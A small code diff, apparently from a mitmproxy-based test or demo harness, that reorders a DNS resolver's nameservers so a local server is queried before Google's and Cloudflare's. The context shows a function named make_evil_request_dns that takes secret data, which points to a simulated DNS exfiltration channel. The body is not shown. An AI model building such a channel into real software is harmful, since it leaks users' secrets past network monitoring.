@@ -211,7 +211,15 @@ Returns:
 import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
 
 resolver = dns_resolver.Resolver()
-resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]
+
+# make sure that your DNS server is first
+# the order is important
+# the resolver library gave up after receiving a response from google
+resolver.nameservers = [
+    "127.0.0.1",  # loopback address pointing to your own machine - a local DNS server
+    "8.8.8.8",  # Google's primary public DNS server
+    "1.1.1.1",  # Cloudflare's public DNS server
+]
 
 
 def make_evil_request_dns(secret_data: str) -> Optional[str]:
